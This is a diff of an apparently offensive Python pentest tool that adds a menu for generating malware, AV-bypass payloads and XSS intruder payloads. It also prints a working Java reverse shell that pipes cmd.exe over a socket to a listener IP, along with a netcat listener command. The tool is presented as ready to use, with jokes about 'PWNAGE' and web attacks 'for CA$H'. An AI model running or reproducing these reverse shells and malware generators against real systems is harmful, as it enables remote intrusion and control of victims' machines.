         print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + """
 String host="%s";
-int port=1347;
+int port=%s;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-""" % listener_ip)
+""" %(listener_ip, rp13))
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tJava Windows Listener\t\t***\n" + bcolors.ENDC)
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1339\n\n\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp13))
+        print("\t NOTE:\t Use this shell when you have access to a Java based web application and the OS in use is Windows. Things like Jinkens, etc..\n")
         print("\t*******************************************************************\n")
-    elif options == 999:
+    elif options == "99":
         break
     else:
        input("Go ahead and pick the shell you need!: ")
+
+## Malware Sub-menu 
+def Malware():
+  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tMALWARE TIME!!!!!" + bcolors.ENDC)
+  while(1):
+    print(bcolors.ERROR + "\t*******************************************************************" + bcolors.ENDC)
+    print("\t(1)\tGenerate all Malware-----(this would be for a malware test)")
+    print("\t(2)\tGenerate only Bypass-----(this would be for Pen test)")
+    print("\t(3)\tGenerate Marantal the Mantroll Special-----(my fav stuff)")
+    print("\t(4)\tGenerate only Malware that does not use Meterpreter")
+    print("\t(99)\tGo back to the main menu")
+    print(bcolors.BLUE + "\t*******************************************************************" + bcolors.ENDC)
+
+    options = input("\nW4@+ Ma1w@r3 R U W@^t1ng Brobi-Wan: ")
+    if options == "1":
+       archFile()
+       gen_000()
+       gen_010()
+       gen_020()
+       gen_100()
+       gen_200()
+       gen_210()
+       gen_300()
+       gen_320()
+       gen_330()
+       gen_340()
+       gen_340()
+       gen_350()
+       gen_360()
+       gen_400()
+       gen_401()
+       gen_410()
+       gen_420()
+       gen_430()
+       gen_440()
+       rc_file()
+    elif options == "2":
+       archFile()
+       gen_300()
+       gen_320()
+       gen_330()
+       gen_340()
+       gen_350()
+       gen_360()
+       gen_400()
+       gen_401()
+       gen_410()
+       gen_420()
+       gen_430()
+       gen_440()
+       rc_file()
+    elif options == "3":
+       archFile()
+       gen_400()
+       gen_401()
+       gen_410()
+       gen_420()
+       gen_430()
+       gen_440()
+       rc_file()
+    elif options == "4":
+       archFile()
+       gen_020()
+       gen_340()
+       gen_350()
+       gen_400()
+       rc_file()
+    elif options == "99":
+       break
+    else:
+       input("You must be a Pats Fan! Come on pick something... ")
+
+## Web Payload Help 
+def webpl():
+  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWeb Applications for CA$H!!!" + bcolors.ENDC)
+  while(1):
+    print(bcolors.ERROR + "\t*******************************************************************" + bcolors.ENDC)
+    print("\t(1)\tGenerate intruder payloads for Form Post Request-(Save the request with Burp)")
+    print("\t(99)\tGo back to the main menu")
+    print(bcolors.BLUE + "\t*******************************************************************" + bcolors.ENDC)
+
+    options = input("\nW3b @c+10n Bro-pimpin: ")
+    if options == "1":
+       webfolder = "./aMALgamation/current/WebPayloads/"
+       if not os.path.exists(webfolder):
+           os.makedirs(webfolder)
+       Postform = input("Where is the req file located?: ")
+       os.system(r"cat {0} | grep '&' >{1}req.1".format(Postform, webfolder))
+       os.system(r"sed 's/&/\n/g' <{0}req.1 |cut -d '=' -f 1 > {0}payloadhelp.txt".format(webfolder)) 
+       file = open("./aMALgamation/current/WebPayloads/payloadhelp.txt", "r")
+       data = file.readlines()
+       for line in data:
+           os.system(r"sed 's/ABC/{0}/g' ./src/xss.txt  > {1}{0}XSSpayload.txt".format(line.strip(), webfolder)) 
+       file.close()
+       print("\t\tYour Payloads are in ---- {0} ---- Enjoy the PWNAGE".format(webfolder))
+    elif options == "2":
+       print("more to be added")
+    elif options == "99":
+       break
+    else:
+       input("You must be a Pats Fan! Come on pick something... ")
 
 
 ## Quit
@@ -1011,77 +1173,39 @@ def main():
 
   if (listener_ip == "127.0.0.1"):
       local_ip = get_local_ip(interface)
-      listener_ip = input("Enter IP Address for the Listenser (%s): " % local_ip) or local_ip
+      wireless = get_local_ip(winterface)
+      print("The eth0 interface has: {0} : as its address. The wlan0 interface has: {1} : as its address.\n".format(local_ip, wireless) + bcolors.ERROR + bcolors.BOLD + "If you do not input a listener address it will default to the eth0 interface address\n\n" + bcolors .ENDC)
+      listener_ip = input("\tEnter IP Address for the Listenser:  ") or local_ip 
 
   print("\n\tYOU HAVE SET THE LHOST TO:   %s " % listener_ip)
-
+  archFile()
   while(1):
     print("\t*******************************************************************")
     print("\t*******************************************************************")
     print("\t*******************************************************************")
-    print("\t(1)\tGenerate all Malware-----(this would be for a malware test)")
-    print("\t(2)\tGenerate only Bypass-----(this would be for Pen test)")
-    print("\t(3)\tGenerate Marantal the Mantroll Special-----(my fav stuff)")
-    print("\t(4)\tTest regasm & regsvcs payloads-----(Testing)")
-    print("\t(5)\tShell Cheat ===========(gives you shells to put in)")
+    print("\t(1)\tMalware Creation =======(generates malware and bypasses)")
+    print("\t(2)\tShell Cheat ============(gives you shells to put in)")
+    print("\t(3)\tWeb Payload Help =======(not yet developed)")
+    print("\t(4)\tKerb & Sysvol ==========(not yet developed)")
     print("\t(9)\tYou don't want to do anything----------(DUMB)")
     print("\t*******************************************************************")
 
-    options = int(input("\nPiCk y0u4 Po1$oN: "))
+    options = input("\nPiCk y0u4 Po1$oN: ")
 
-    if options == 1:
-       gen_000()
-       gen_010()
-       gen_020()
-       gen_020()
-       gen_100()
-       gen_200()
-       gen_210()
-       gen_300()
-       gen_320()
-       gen_330()
-       gen_340()
-       gen_350()
-       gen_360()
-       gen_400()
-       gen_410()
-       gen_420()
-       gen_430()
-       gen_440()
-       rc_file()
-    elif options == 2:
-       gen_300()
-       gen_320()
-       gen_330()
-       gen_340()
-       gen_350()
-       gen_360()
-       gen_400()
-       gen_410()
-       gen_420()
-       gen_430()
-       gen_440()
-       rc_file()
-    elif options == 3:
-       gen_300()
-       gen_320()
-       gen_340()
-       gen_400()
-       gen_410()
-       gen_420()
-       rc_file()
-    elif options == 4:
-       gen_430()
-       gen_440()
-       rc_file()
-    elif options == 5:
+    if options == "1":
+       Malware()
+    elif options == "2":
        Shells()
-    elif options == 9:
+    elif options == "3":
+       webpl()
+    elif options == "4":
+       print("Nothing Yet")
+    elif options == "9":
        exit()
     else:
        input("BAHHHHH PICK SOMETHING!!!!!!...")
 
-#call main() function 
+#call main() function
 if __name__ == '__main__':
   main()
 
